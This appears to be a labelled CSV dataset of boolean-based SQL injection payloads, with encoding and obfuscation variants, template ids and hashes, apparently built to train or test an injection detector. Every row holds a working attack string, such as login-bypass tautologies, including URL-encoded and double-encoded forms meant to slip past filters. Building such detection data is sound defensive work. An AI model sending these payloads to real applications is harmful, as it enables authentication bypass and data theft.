payload,label,attack_type,variant_type,encoding_type,template_id,normalized_hash,payload_hash,length
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2FCHAR%2897%29%3D%27a%27%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,1,sqli_boolean,comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_BOOLEAN_001,26ffd2d4cd7808c1bdac7d25c9b0299b,720d3005789ff5c12679c215007e69b7,87
id%3D%271%27+or+%2751%27%3D%2751%27,1,sqli_boolean,case_var,url_encoded,SQLI_BOOLEAN_005,119cbd763dc757c99ebf44582c28d765,3f9b27b669b1b7e4f999f4bc9c8e89fb,35
username%253Dadmin%2527%2509OR%2509%2527a%2527%253D%2527a%2527%2509%253B--%2509-,1,sqli_boolean,comment_semicolon_comment|ws_tab,double_encoded,SQLI_BOOLEAN_003,aeb2426272f1cb9db71f1694f49db8cb,a92a1ddb95249205f724a9456023da94,80
id=1' Or NOT (2>1) ;-- -,1,sqli_boolean,case_var|comment_semicolon_comment,raw,SQLI_BOOLEAN_007,c7ae25ac095649ea9ff4a87ccc8d45d2,5e477f41afda4b854b06050e84302218,24
id%3D1%27%09or%0915%3D15%09%23,1,sqli_boolean,case_var|comment_hash|ws_tab,url_encoded,SQLI_BOOLEAN_006,cd7137164ce8ab988b08ba984c12d209,69d804d366d1ed497a4c591c79a37c88,30
id%3D1%27+or+2%3E1+--+-,1,sqli_boolean,case_var|comment_dash_dash_space,url_encoded,SQLI_BOOLEAN_001,d18a3924d11ca1effae9f7717b357d4a,d9d18b100f6ba04b2d3eaf087ce27105,23
id%253D1%2527%2BOR%2BNOT%2B%2528%2527a%2527%253D%2527a%2527%2529%2B--%2B-,1,sqli_boolean,comment_dash_dash_space,double_encoded,SQLI_BOOLEAN_007,773d21333f52a1f6996bb914ec852d24,198a5c60a12befc9a1f8fd5f53f968fe,73
id%3D1%27+oR+97%3D97+%2F%2A,1,sqli_boolean,case_var|comment_block_comment,url_encoded,SQLI_BOOLEAN_006,3b0e032b1af9b0929e65fbf1be6389f1,36277c04c64f2a4abe0b62222bab2369,27
username%253Dadmin%2527%2BOr%2B%2527a%2527%253D%2527a%2527%2B--,1,sqli_boolean,case_var|comment_dash_dash,double_encoded,SQLI_BOOLEAN_003,574634697bdb7e8ee1536e6307473ce6,7e6978f6109569ecfa56fcbdc9f8c1c2,63
id%3D1%27+OR+%28LENGTH%28%27test%27%29%3D4%29+--+-,1,sqli_boolean,case_var|comment_dash_dash_space,url_encoded,SQLI_BOOLEAN_004,4ffb4aaa8d6057c6a21db55a65117dfe,cab6ff7e29d1eafbbe5efc5a5ea4c678,50
id=1' +or+ 43%3D43 +--,1,sqli_boolean,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_BOOLEAN_006,950fb696aa6b2a9c7ef9aa3ecf8ca1ed,3eb0af41682f67ec75bf44e3df165358,22
id%3D1'%20or%20NOT%20(7=7)%20%23,1,sqli_boolean,case_var|comment_url_hash|ws_url_space,partially_encoded,SQLI_BOOLEAN_007,6c2e953d3d8cb3b821f124d7e1d1aa91,8a1ba0bd46aae54ea650754d4393a3ee,32
id%253D1%2527%2BOR%2BNOT%2B%25281%253D1%2529%2B--,1,sqli_boolean,case_var|comment_dash_dash,double_encoded,SQLI_BOOLEAN_007,885f4880cabeaae911372f87708c6a37,bfe8af22c46cd897142a7af874cb8610,49
id%3D1%27+or 27%3D27+%23,1,sqli_boolean,case_var|comment_url_hash,partially_encoded,SQLI_BOOLEAN_006,873dab484456298e51c3af87bbe5e420,e5515ad4ae5b849f45edf9da3d6cefb0,24
id=1'%20OR%2037=37%20--%20-,1,sqli_boolean,comment_dash_dash_space|ws_url_space,raw,SQLI_BOOLEAN_006,45493df4addefc7175a4eaa694bc35b9,1ddf48eaea5c8fae820506368e27e306,27
id=1%27+OR+(LENGTH(%27test')=4)+;--+-,1,sqli_boolean,comment_semicolon_comment|ws_plus,partially_encoded,SQLI_BOOLEAN_004,5566a4bec9e654000200141ef2d3b3fd,c2b6e1158ca9d39ea8d788a9e04d4711,37
id%3D1%27+and+1%3D1+--,1,sqli_boolean,case_var|comment_dash_dash,url_encoded,SQLI_BOOLEAN_002,95859dbda485ff137a8c12a77a89fb88,b67599dd021bc53d75f623d4fc2b623b,22
id%3D1%27%2BWHErE%2B1%3D1%2BoR%2B%27a%27%3D%27a%27%2B%2523,1,sqli_boolean,case_var|comment_url_hash|ws_plus,url_encoded,SQLI_BOOLEAN_008,cdf66120d0d668ec6678b6a5b289a5dd,3e92916d941da8ce9432b1fa902df343,58
id%3D1'++OR  (100<200) +%23,1,sqli_boolean,comment_hash|ws_multi_space,partially_encoded,SQLI_BOOLEAN_004,ec9764be18e68b5905dd5786f2e303b0,40cec65c4206fe5679bf9b6e372f947a,27
id%3D1'+Or+17=17+%2F%2A,1,sqli_boolean,case_var|comment_block_comment,partially_encoded,SQLI_BOOLEAN_006,bec1bc14dee591952707a398d589990a,10ef02ccf65dc0cd51b30f3e9225893e,23
id%3D1%27	OR	88=88	%23,1,sqli_boolean,comment_url_hash|ws_tab,partially_encoded,SQLI_BOOLEAN_006,fae9785fbed488442fc9420cd1eef17a,3d6eb1e6d1af390beded26c81706ca74,22
username%253Dadmin%2527%252BOR%252BLENGTH%2528%2527test%2527%2529%253D4%252B%252523,1,sqli_boolean,case_var|comment_url_hash|ws_plus,double_encoded,SQLI_BOOLEAN_003,e1c32b2d2d1f925897750ca5a9dffad8,07f0fa4bf04573d3c1b0d911c0e9e734,83
id%253D1%2527%2B%2BAND%2B%2B2%253E1%2B%2B%252523,1,sqli_boolean,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_BOOLEAN_002,9e4d73281640d1f0b8368de76cb9e343,2273598c8528346e9976817fa49f647b,48
id%253D1%2527%2BAND%2B7%253D7%2B%253B--%2B-,1,sqli_boolean,comment_semicolon_comment,double_encoded,SQLI_BOOLEAN_002,07ff73fefbf895d8f3370218d08bab28,5bc64f996d8543717babcdbb00ceb8c3,43
id%253D%25271%2527%2BOR%2B%252789%2527%253D%252789%2527,1,sqli_boolean,case_var,double_encoded,SQLI_BOOLEAN_005,47e8bde7a985b3f71a8d1c849f493cad,19b7c4bac5c936988a30f702e4ecba35,55
id=1' OR (LENGTH('test')=4) /*,1,sqli_boolean,case_var|comment_block_comment,raw,SQLI_BOOLEAN_004,1ee00118c54308e3eb79604bc47d9585,144f273fc24ab46c132f3ee15ad3de1f,30
username%253Dadmin%2527%2BOr%2B1%253D1%2B--,1,sqli_boolean,case_var|comment_dash_dash,double_encoded,SQLI_BOOLEAN_003,1244370f3462cf6640395ba9d4b45d4e,89aa52551dd38aecd0def194062d2df8,43
id=1'+OR+1=1+#,1,sqli_boolean,case_var|comment_hash|ws_mixed_ws,raw,SQLI_BOOLEAN_001,da72cc067d8739629f165549fbd86818,bd0c1cd27b5af1916b40657d77f23b38,14
id%3D1%27%2520Or%2520NOT%2520%287%3D7%29%2520--%2520-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_url_space,url_encoded,SQLI_BOOLEAN_007,adddcd2d2be6ffd88492095d61253a7b,68a3129231ad62bdd9d1076ec60bac4d,53
id%253D1%2527%2BAnd%2BASCII%2528%2527A%2527%2529%253D65%2B%253B--%2B-,1,sqli_boolean,case_var|comment_semicolon_comment,double_encoded,SQLI_BOOLEAN_002,1f895c84ce4464cd6bcdbdeb865fec94,171ce7ff816e8f25c118c20933dee443,69
id=1'+oR+NOT+(7=7)+/*,1,sqli_boolean,case_var|comment_block_comment|ws_plus,raw,SQLI_BOOLEAN_007,b4ec59ce4c5dc1e19b05fd10d1c1d83c,6914dff6cc3252735195c8de775bfb55,21
id%3D%271%27+Or '19%27=%2719'%23,1,sqli_boolean,case_var|comment_url_hash,partially_encoded,SQLI_BOOLEAN_005,661cb499393daf9575219e5d4ebc34ae,0464a9fdcb94314710e21bdc1d5c0d87,32
id%253D1%2527%2509OR%2509%2528CHAR%252897%2529%253D%2527a%2527%2529%2509%252523,1,sqli_boolean,comment_url_hash|ws_tab,double_encoded,SQLI_BOOLEAN_004,abec21585b2709b1a1bfe30185680ec3,15e811d1aed9c1972536f8c42b96e12e,79
id%3D1'+Or+NOT+(CHAR(97)='a%27)+%2F%2A,1,sqli_boolean,case_var|comment_block_comment,partially_encoded,SQLI_BOOLEAN_007,3f460e7b1bcd97b6e46469906b41e6ed,61e39e7f727a509a143c1fe5a2652ce9,38
username%3Dadmin%27+Or+%27a'%3D%27a%27+--,1,sqli_boolean,case_var|comment_dash_dash|ws_plus,partially_encoded,SQLI_BOOLEAN_003,a2bb9a0d50f9fc743d150c60841c3d7a,fcf7cd71ad924ae62a552b2a99fec13d,41
id=1%27 OR+62=62 --,1,sqli_boolean,comment_dash_dash|ws_space,partially_encoded,SQLI_BOOLEAN_006,5ccfbaa719017e6d085c81056c1f63da,5cc54485955879d5a545ece6f215c918,19
id%253D%25271%2527%252F%252A%252A%252FOR%252F%252A%252A%252F%252730%2527%253D%252730%2527%2523,1,sqli_boolean,comment_hash|ws_comment_ws,double_encoded,SQLI_BOOLEAN_005,b37b93cc2c9f7df46789d4019cd87b72,45adfef26c8fa671d1d7747e722d581d,94
id%3D1'%20AND%20100<200%20/%2A,1,sqli_boolean,comment_block_comment|ws_url_space,partially_encoded,SQLI_BOOLEAN_002,d0fa14c50733e4827f3fd9909d51a6c0,bd19d3564c6762c802911de5568c538c,30
username=admin'+or+2>1+--+-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_mixed_ws,raw,SQLI_BOOLEAN_003,b18a9dfc6bd7d7c85d4283286b3de856,b18a9dfc6bd7d7c85d4283286b3de856,27
id%253D1%2527%2B%2B%2BwHere%2B%2B%2B1%253D1%2B%2B%2BOr%2B%2B%2B7%253D7%2B%2B%2B%253B--%2B%2B%2B-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_mixed_ws,double_encoded,SQLI_BOOLEAN_008,deda9477a1694f7bc3784fd6c2e53052,8b59b94addda15da9fa616430ade3617,96
id%253D1%2527%2Bor%2B%2528CHAR%252897%2529%253D%2527a%2527%2529%2B--,1,sqli_boolean,case_var|comment_dash_dash,double_encoded,SQLI_BOOLEAN_004,c529a513c45766b0e3527044255b93f9,c55282255e1562f1a50e76389ad5602c,68
id%3D1%27+OR NOT+(LENGTH('test%27)=4)+/%2A,1,sqli_boolean,comment_block_comment,partially_encoded,SQLI_BOOLEAN_007,04f28f1c5ad399ce0470b1bd77cbeacc,a6a0abcb74c545b9a6c157e39ae51864,42
id=1' OR (%27a'=%27a')+%2F%2A,1,sqli_boolean,comment_block_comment,partially_encoded,SQLI_BOOLEAN_004,1d6a2748294be673c19fcfb22a39b1e8,4ac5d4b364b0112ca56ba0a4ceffa06f,29
username=admin%27 +Or+ 100<200 +--,1,sqli_boolean,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_BOOLEAN_003,c6266f8841bd4bd1fef75e8e61bbdf69,07ffa51d824219d08a6b54fa6437c77c,34
id%3D1'%2F**%2FOr/%2A%2A/52=52%2F**%2F--/%2A%2A/-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_comment_ws,partially_encoded,SQLI_BOOLEAN_006,a03277608869399803a6ac8eeffe25ca,cfa39cc1ef2a20d3bcb7f0b90a72b0ce,49
username=admin%27 +OR +'a'%3D%27a'++%23,1,sqli_boolean,case_var|comment_hash|ws_multi_space,partially_encoded,SQLI_BOOLEAN_003,271a83ed3c603f510069e58edb08e7dc,cb9f99b32427abf0252a96807927b123,39
id%3D1'%20AND%207=7%20#,1,sqli_boolean,comment_hash|ws_url_space,partially_encoded,SQLI_BOOLEAN_002,9702f6466f43f691a860f1392c28827e,48ba2365aa81b56f253dda239a47487c,23
id='1'  or  '3'='3'--,1,sqli_boolean,case_var|comment_dash_dash|ws_multi_space,raw,SQLI_BOOLEAN_005,137b2851b7242656beb628597a57b6e1,d362a198e8a9dbb65a812c149fc5f8a3,21
id=1' OR (100<200) --,1,sqli_boolean,comment_dash_dash,raw,SQLI_BOOLEAN_004,cbc158de8fedebca6a5e7fd869a7737b,6f7478647a1d54bb53da5db452a53654,21
id=1'+OR+(CHAR(97)='a')+#,1,sqli_boolean,case_var|comment_hash|ws_plus,raw,SQLI_BOOLEAN_004,b12fb44acc7578be80f73ff464f0124b,da14d91398219a3251ef88e50566d6cb,25
id%3D1%27+or+%282%3E1%29+--+-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_space,url_encoded,SQLI_BOOLEAN_004,fc90135db5da404a94c7aa62dfc4f384,4bbf298d115e3dabdbe932ec19f0ffff,29
id%253D1%2527%2Bor%2B%2528CHAR%252897%2529%253D%2527a%2527%2529%2B%2523,1,sqli_boolean,case_var|comment_hash|ws_space,double_encoded,SQLI_BOOLEAN_004,d48c63323476271fca73b05c7c763c94,0a7b9672e5f9c2cb246ab9a40ae253ed,71
id%3D1%27+where+1%3D1+Or+1%3D1+%3B--+-,1,sqli_boolean,case_var|comment_semicolon_comment,url_encoded,SQLI_BOOLEAN_008,5a33a4e07abb97c77dfeafdfa8feae00,12057848830af3004ff548a1613417b8,38
username=admin'/**/OR/**/100<200/**/--,1,sqli_boolean,case_var|comment_dash_dash|ws_mixed_ws,raw,SQLI_BOOLEAN_003,f98d892e43dfd5cb6baea06d12e76c0b,b07297d3d12099cf8bfeabf05eab17d3,38
id%3D1%27++AND++2%3E1++%2F%2A,1,sqli_boolean,comment_block_comment|ws_multi_space,url_encoded,SQLI_BOOLEAN_002,9ef2597058d80b9d2395ba50ac46398b,5407ec1a944cc417539e8b2d8669739d,29
username%3Dadmin%27+OR+%27a%27%3D%27a%27+--+-,1,sqli_boolean,case_var|comment_dash_dash_space,url_encoded,SQLI_BOOLEAN_003,67753a2a11ebcd031b20134845ed673f,75594b24946e98b88290704117fb8100,45
id=1'  OR  NOT  (7=7)  ;--  -,1,sqli_boolean,comment_semicolon_comment|ws_multi_space,raw,SQLI_BOOLEAN_007,bb9046ebabc56e5a08693fef475c5248,8f89c43ba966460d58b1f7626448a890,29
id%3D1%27%09OR%0952%3D52%09%2523,1,sqli_boolean,comment_url_hash|ws_tab,url_encoded,SQLI_BOOLEAN_006,8150760059c75908f75fa1cd86fcb7a5,637e17a75cb0d26fa35d9ce40193ae51,32
id%3D1%27%2F%2A%2A%2FWherE%2F%2A%2A%2F1%3D1%2F%2A%2A%2FOr%2F%2A%2A%2F100%3C200%2F%2A%2A%2F%2F%2A,1,sqli_boolean,case_var|comment_block_comment|ws_mixed_ws,url_encoded,SQLI_BOOLEAN_008,c3eeb434661ef838bdf9e676f9afa2bd,5b65e3264b027d1dcacc1ef13ae26b58,96
id%253D1%2527%252BOR%252B%2528LENGTH%2528%2527test%2527%2529%253D4%2529%252B%252F%252A,1,sqli_boolean,case_var|comment_block_comment|ws_plus,double_encoded,SQLI_BOOLEAN_004,cc0a4f120d39b0eec290429cefdcc8eb,cd642eba3292a02a7ba5bf6440990d05,86
id%3D%271%27+or+%2740%27%3D%2740%27,1,sqli_boolean,case_var,url_encoded,SQLI_BOOLEAN_005,22d94aa9f9653682defeca0ca4a92616,138a0d672840657bf1a75c3b727598af,35
id%253D1%2527%252BAnD%252BLENGTH%2528%2527test%2527%2529%253D4%252B--%252B-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_plus,double_encoded,SQLI_BOOLEAN_002,fec327ca404d732e4e2c42b4b917b930,a5e3122d392b0162703fc62981407ae5,75
username=admin' OR 100<200 ;-- -,1,sqli_boolean,comment_semicolon_comment|ws_space,raw,SQLI_BOOLEAN_003,92776dcf1358c518172382d194bab4d0,8e3649ee2ea7aced036acb7655b2b235,32
id=1' OR 2>1 %23,1,sqli_boolean,comment_url_hash,raw,SQLI_BOOLEAN_001,3bc773df70f78c44e60b3ebf8f91396c,3c18f2e708d3e48e28e5c31284c21741,16
id%253D1%2527%2B%2BANd%2B%2BASCII%2528%2527A%2527%2529%253D65%2B%2B%2523,1,sqli_boolean,case_var|comment_hash|ws_multi_space,double_encoded,SQLI_BOOLEAN_002,4c8878e2fc8eda8c5e250dabb23ab827,2b71ca7288e6cec1ca068b287c15aa49,72
id=1'%20Or%201%3D1%20--,1,sqli_boolean,case_var|comment_dash_dash|ws_url_space,partially_encoded,SQLI_BOOLEAN_001,d3aee792e9f97bf9ce7ae6c775cd0f03,693cfd12dfa2f9a88c0c8d096737a4b2,23
id=1'/**/or/**/(ASCII('A')=65)/**/%23,1,sqli_boolean,case_var|comment_url_hash|ws_mixed_ws,raw,SQLI_BOOLEAN_004,72c514c5a1d90d55c87dd82f0ed8fcc7,e3c1a7242b396c51712ce6980ce60673,37
username%3Dadmin%27+oR+100%3C200+%2F%2A,1,sqli_boolean,case_var|comment_block_comment|ws_plus,partially_encoded,SQLI_BOOLEAN_003,3b79c9465707353b29bd2e2fff81cc23,e41cf82155bffd75e9fbd5a044e21f59,39
id%3D1%27+OR+NOT+%28CHAR%2897%29%3D%27a%27%29+%2523,1,sqli_boolean,comment_url_hash|ws_space,url_encoded,SQLI_BOOLEAN_007,2afadf07f3e49471d8978e88468caf39,ce376bd705b3469711f518a66d22172f,51
id%253D1%2527%2Bor%2B6%253D6%2B%2523,1,sqli_boolean,case_var|comment_hash,double_encoded,SQLI_BOOLEAN_006,d38c18c87b69663a7c6a119e2431483d,fcf5722b625f10664e49c2ce1dbae636,36
username%3Dadmin%27++OR++LENGTH%28%27test%27%29%3D4++%3B--++-,1,sqli_boolean,comment_semicolon_comment|ws_multi_space,url_encoded,SQLI_BOOLEAN_003,c3b81d2eadb72101306a96301f926ccb,166334165d70a4c3bee22ae14429c0e5,61
id%253D1%2527%252BOR%252BCHAR%252897%2529%253D%2527a%2527%252B%252523,1,sqli_boolean,case_var|comment_url_hash|ws_plus,double_encoded,SQLI_BOOLEAN_001,6b11faf2c64ea61db5dab85dea13807d,9f3e06abebd23a906066eb107742cb68,69
username=admin'%20Or%20'a'='a'%20--%20-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_mixed_ws,raw,SQLI_BOOLEAN_003,2a654347f82e07fdf35818eeec47ecac,816c4c25ac7f84b671a8c5d81472ac3f,39
id%3D1%27%2520And%2520LENGTH%28%27test%27%29%3D4%2520%3B--%2520-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_url_space,url_encoded,SQLI_BOOLEAN_002,8234844eac69629a8e83e6e3c249c430,e4e782cabdf9fb14c4db7ec9abaf5661,64
id%253D1%2527%252520OR%252520%2528%2527a%2527%253D%2527a%2527%2529%252520%252523,1,sqli_boolean,comment_url_hash|ws_url_space,double_encoded,SQLI_BOOLEAN_004,697616aed56a242e3e22c54afa4e3f2a,01233fb8dd0336db906b687931308e8b,80
id%3D1%27+OR+NOT+%28LENGTH%28%27test%27%29%3D4%29+--+-,1,sqli_boolean,case_var|comment_dash_dash_space,url_encoded,SQLI_BOOLEAN_007,33f54a2feaafa95c5ccfd13a01522de5,4e8792542dd296b344e8d79071c062c4,54
id%253D1%2527%2509Or%2509NOT%2509%2528LENGTH%2528%2527test%2527%2529%253D4%2529%2509%252F%252A,1,sqli_boolean,case_var|comment_block_comment|ws_tab,double_encoded,SQLI_BOOLEAN_007,9f581d2d6bcd4296c4be9cc39edf4b59,9fcdbe751e72fa6c0e70d0f2ae6ba05c,94
id%3D1%27%2F%2A%2A%2FOr%2F%2A%2A%2F%281%3D1%29%2F%2A%2A%2F--%2F%2A%2A%2F-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_comment_ws,url_encoded,SQLI_BOOLEAN_004,fbdb330ee8313ac855ae34173a79a842,bab7f4f3920f0e25cb31b3eba7f1e229,73
username%3Dadmin%27%2F%2A%2A%2For%2F%2A%2A%2F7%3D7%2F%2A%2A%2F%2F%2A,1,sqli_boolean,case_var|comment_block_comment|ws_comment_ws,url_encoded,SQLI_BOOLEAN_003,964f6d48c531aad9fdc249d4e73a0d67,0a0a6708e2918645575e3c36e8b1f913,68
id=1'%20Or%2016=16%20%23,1,sqli_boolean,case_var|comment_url_hash|ws_mixed_ws,raw,SQLI_BOOLEAN_006,1236a9517bee3abe6d4c32de36890641,b2df45ebc73c329d91d91b63348a55b0,24
id%3D1%27%09WHERE%091%3D1%09OR%097%3D7%09%3B--%09-,1,sqli_boolean,comment_semicolon_comment|ws_tab,url_encoded,SQLI_BOOLEAN_008,d835d348d146337d22d3c3498c75ce97,6639666d1e8826c12cb7a902eed4180c,50
id%253D1%2527%2B%2BwherE%2B%2B1%253D1%2B%2BOr%2B%2B2%253E1%2B%2B%252523,1,sqli_boolean,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_BOOLEAN_008,d19e30a689379765ba041676e57d79a4,24f53342df0be404fb16fdc880d4530f,71
id%3D%271%27+Or+%2714%27%3D%2714%27%23,1,sqli_boolean,case_var|comment_hash,url_encoded,SQLI_BOOLEAN_005,559d6de7ac2bb149aee5f82db62a6e26,15f614ae4a65aaeffc0418e132460b29,38
id%253D1%2527%2Bor%2BNOT%2B%25287%253D7%2529%2B%252F%252A,1,sqli_boolean,case_var|comment_block_comment,double_encoded,SQLI_BOOLEAN_007,8d64a75afbdbd8c1dfa1bc19138365fe,2f4f1d9519202989b19d2d61f614e565,57
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FCHAR%2897%29%3D%27a%27%2F%2A%2A%2F%2F%2A,1,sqli_boolean,comment_block_comment|ws_comment_ws,url_encoded,SQLI_BOOLEAN_002,a1add9ae7788c84f6a799c72bccc777f,338d6eaddf00f9b5eb56dee4c0ec21d9,76
id%253D1%2527%2BOR%2B1%253D1%2B%2523,1,sqli_boolean,comment_hash,double_encoded,SQLI_BOOLEAN_001,fa46d156cf965a294138c43a26a69ed6,21f1f52214cd55d4cc6fb10fff656425,36
username%3Dadmin' OR 7=7 %3B--+-,1,sqli_boolean,case_var|comment_semicolon_comment,partially_encoded,SQLI_BOOLEAN_003,7a75fe05dc03c9f9ebded30cc4ad9efd,895ecc671ebb8ffb29954e8bf6540b6a,32
id%3D%271%27+OR+%2737%27%3D%2737%27,1,sqli_boolean,case_var,url_encoded,SQLI_BOOLEAN_005,14c8347c888403df700a5a902a30ed43,cb20b147412ab0cbb6e911cc13e01452,35
id=1' Where 1=1 OR ASCII('A')=65 /*,1,sqli_boolean,case_var|comment_block_comment|ws_space,raw,SQLI_BOOLEAN_008,03957205a13bc811fb9277f3b6064311,77fcef309b246526e20040377f1e879c,35
id%253D1%2527%252520WHeRe%2525201%253D1%252520Or%252520%2527a%2527%253D%2527a%2527%252520%252F%252A,1,sqli_boolean,case_var|comment_block_comment|ws_url_space,double_encoded,SQLI_BOOLEAN_008,a33bbc1897173f74c673afbbeef1adba,ff2b7c038f1d3af5f24d126f99d0eecb,99
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2F100%3C200%2F%2A%2A%2F%2523,1,sqli_boolean,case_var|comment_url_hash|ws_comment_ws,url_encoded,SQLI_BOOLEAN_002,06d449bc1f54190cfbf891c5d40a4f95,27dba29ade8fe19bf3a2737cd61b05b2,62
id%253D1%2527%2Bor%2B90%253D90%2B%252F%252A,1,sqli_boolean,case_var|comment_block_comment|ws_space,double_encoded,SQLI_BOOLEAN_006,e1da2f6f48d90cafce95de1392e4ae09,2970728b1554b2902ac91931db5c414a,43
id=1' OR 98=98 -- -,1,sqli_boolean,case_var|comment_dash_dash_space,raw,SQLI_BOOLEAN_006,fb473f59402c7eeb08f7fdaa08f87f9b,885ad34f91c321ac920885d6bdc10b22,19
username=admin'%2F*%2A%2FOR/*%2A/2%3E1/%2A*//%2A,1,sqli_boolean,comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_BOOLEAN_003,ae1daa6d2abe708cf772f3e8415a37fc,891667f89db130f16b1601f451ddd1c1,48
username=admin'/**/or/**/ASCII('A')=65/**/#,1,sqli_boolean,case_var|comment_hash|ws_mixed_ws,raw,SQLI_BOOLEAN_003,8863eb30e8fb2d9039deb46669a88c56,3e6d1c91cf9ea1f28b05d726846f7117,43
id=1%27+AND 1%3D1 /*,1,sqli_boolean,comment_block_comment,partially_encoded,SQLI_BOOLEAN_002,5eabe41b8ee37b58952d23adb19044ac,a6ea99ebeb47fa6f07dcd4e82bb66b29,20
username=admin%27++OR++2%3E1++--+ -,1,sqli_boolean,comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_BOOLEAN_003,e9c06e7114e73e366bd27b03ac4d962c,e4976225850c5293b0842628decc1fa9,35
id=1' OR ASCII('A')=65 /*,1,sqli_boolean,comment_block_comment,raw,SQLI_BOOLEAN_001,817f0c7488edf3e636292d8f574c25b3,af384c65ad3721a22d2eeffe2f1db954,25
id=1'%20or%201=1%20%23,1,sqli_boolean,case_var|comment_url_hash|ws_url_space,raw,SQLI_BOOLEAN_001,0bfdba583dc9c1828585f5f3458d9e1b,0bfdba583dc9c1828585f5f3458d9e1b,22
id=1'	OR	2>1	--,1,sqli_boolean,comment_dash_dash|ws_tab,raw,SQLI_BOOLEAN_001,68e6d766186d9616ab1b7d6d393def53,6558a2dbd965454c3fed74045d4c7dd0,15
id%3D1' or NOT ('a'%3D%27a') %23,1,sqli_boolean,case_var|comment_hash,partially_encoded,SQLI_BOOLEAN_007,f0c9a6bf441018da1663a17a4660eee9,a3d66c970b11d3897226641e69cccf3d,32
username%253Dadmin%2527%2BOR%2B7%253D7%2B--,1,sqli_boolean,case_var|comment_dash_dash,double_encoded,SQLI_BOOLEAN_003,dd47add0d1287a26319d54575ad6f655,f65a979ea339210ee7e7099aaedf5509,43
id%253D1%2527%2509AND%25097%253D7%2509%252F%252A,1,sqli_boolean,comment_block_comment|ws_tab,double_encoded,SQLI_BOOLEAN_002,9f39b84ac7cda944ba39f479d44648fc,76fa9b4e2485af2930b6688125ebd76b,48
id%3D1'+AND+2>1+;--+-,1,sqli_boolean,comment_semicolon_comment,partially_encoded,SQLI_BOOLEAN_002,d188e5f2a2d61187ed6a8bf80a545c4b,40e3e3019e61f312e92862f63e61a7ee,21
id%3D%271%27%2F%2A%2A%2FOr%2F%2A%2A%2F%2774%27%3D%2774%27%23,1,sqli_boolean,case_var|comment_hash|ws_comment_ws,url_encoded,SQLI_BOOLEAN_005,c7d4d4e482c6f7a6db23371576f7a29a,c03ea0d99aef3561a88acd0ee8fbba76,60
id='1%27+Or+'66%27=%2766',1,sqli_boolean,case_var,partially_encoded,SQLI_BOOLEAN_005,c6f8d9f57aa1467d0a4bb79fc5917f75,f7136e8cb1408d5f1c4bf813b4fb8d64,25
id%253D1%2527%2B%2BOR%2B%2B32%253D32%2B%2B%2523,1,sqli_boolean,case_var|comment_hash|ws_multi_space,double_encoded,SQLI_BOOLEAN_006,f3f4e0b337b87fb21fb64d9d0248b042,87d00ad9628aa77e1a625f59f76935eb,47
id%3D%271'+OR '83%27%3D%2783%27--+-,1,sqli_boolean,comment_dash_dash_space,partially_encoded,SQLI_BOOLEAN_005,bc212e83fcbf22c54703a2c515c6de4b,94ac42604cadf09842c30223c40a48ee,35
id=1' AND CHAR(97)='a' /*,1,sqli_boolean,comment_block_comment,raw,SQLI_BOOLEAN_002,68c971f9ffafb7c7532f5c22665eb5c2,5d2d02b8cf9236491089cd6006dd492c,25
id%253D1%2527%252BOR%252BASCII%2528%2527A%2527%2529%253D65%252B--%252B-,1,sqli_boolean,comment_dash_dash_space|ws_plus,double_encoded,SQLI_BOOLEAN_001,e36aa6d391315e70f7b01fae00912d5e,75d9328a4d952acdca31d8524e5e911b,71
username%3Dadmin%27%09or%09LENGTH%28%27test%27%29%3D4%09%2523,1,sqli_boolean,case_var|comment_url_hash|ws_tab,url_encoded,SQLI_BOOLEAN_003,2a3b5e959cb218cd55fd680ab38d4f8e,d867fe9fdcd24a697702bd181ee6f65c,61
